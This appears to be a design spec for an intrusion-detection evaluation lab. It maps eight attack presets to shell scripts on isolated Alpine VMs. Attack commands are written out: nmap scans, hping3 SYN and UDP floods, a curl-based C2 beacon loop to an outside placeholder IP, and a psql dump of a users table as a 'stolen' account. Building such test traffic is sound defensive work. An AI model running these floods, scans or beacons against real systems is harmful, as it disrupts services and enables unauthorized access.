# Dataplane spec — Yatesbury scenarios

Compromise/restore scripts required on Alpine hosts to back the 8 new
Yatesbury presets in `eval_iid.py`. Each script follows the existing
contract: drop a flag file (`/tmp/compromised-<key>`) that the host's
cron picks up, run for ~60-90 seconds, then exit; restore removes the
flag and any temporary state.

All scripts go under `/root/scenario/` on the relevant Alpine VM.

## Mapping table

| Preset | Host | trigger | restore | Description |
|---|---|---|---|---|
| yates-vertical-scan      | APP  (10.2.100.10) | compromise-vertical-scan.sh     | restore-app.sh | `nmap -sS -p 1-1000 10.1.200.10` (60s) |
| yates-syn-flood-dos      | APP  (10.2.100.10) | compromise-syn-flood.sh         | restore-app.sh | `hping3 -S --flood -p 5432 10.1.200.10` (30s) |
| yates-syn-flood-ddos     | APP  + WEB         | compromise-syn-ddos.sh          | restore-app.sh | Coordinated SYN flood from APP + WEB to DB:5432 |
| yates-udp-ddos           | APP  + WEB         | compromise-udp-ddos.sh          | restore-app.sh | `hping3 -2 --flood -p 53 10.1.200.10` from 2 hosts |
| yates-distributed-scan   | APP  + WEB         | compromise-distributed-scan.sh  | restore-app.sh | Each host scans 10 ports of DB — low-and-slow |
| yates-infection-monkey   | APP                | compromise-infection-monkey.sh  | restore-app.sh | Chain: scan DB → ssh probe → ssh probe WEB |
| yates-c2-beacon          | APP                | compromise-c2-beacon.sh         | restore-app.sh | `while true; do curl -s -X POST https://8.8.8.8 -d ping; sleep 30; done` for 5 min |
| yates-unauth-db          | WEB  (10.1.100.10) | compromise-unauth-db.sh         | restore-web.sh | `psql -h 10.1.200.10 -U stolen 'SELECT * FROM users'` |

## Trigger script template

```sh
#!/bin/sh
# /root/scenario/compromise-<scenario>.sh
# Run as root on the Alpine host. Flag file picked up by cron.
set -e
flag=/tmp/compromised-<scenario>
touch "$flag"
trap 'rm -f "$flag"' EXIT INT TERM

# Run attack for ~60 seconds, then auto-restore
( sleep 60; rm -f "$flag" ) &

# Actual attack invocation (example for SYN flood DoS):
hping3 -S --flood -p 5432 10.1.200.10 &
ATTACK_PID=$!

sleep 60
kill -TERM $ATTACK_PID 2>/dev/null || true
rm -f "$flag"
```

## Restore script template

```sh
#!/bin/sh
# /root/scenario/restore-<host>.sh
set -e
# Remove all compromise flags
rm -f /tmp/compromised-*
# Kill any leftover attack processes
pkill -f 'hping3|nmap|nc.*<flag-port>' 2>/dev/null || true
echo "Restored"
```

## Host bootstrap dependencies

```sh
# APP / WEB hosts need: hping3, nmap, nc, curl, psql client
apk add --no-cache hping3 nmap nmap-scripts netcat-openbsd curl postgresql-client
```

## Notes

- **C2 beacon target**: `8.8.8.8` is a placeholder for "external NAT2".
  If lab's NAT2 cloud has a different exit IP, change accordingly.
- **UDP DDoS port**: paper uses DNS (53). DB host needs a UDP listener
  (e.g., `socat UDP-LISTEN:53,fork SYSTEM:cat > /dev/null`) or the
  attack will hit closed port and ICMP unreachable noise will skew
  flow features.
- **Distributed scan**: ideally 2 attackers per scenario. WEB and APP
  hosts already exist; mgt-host can act as a third coordinator without
  participating in the scan.
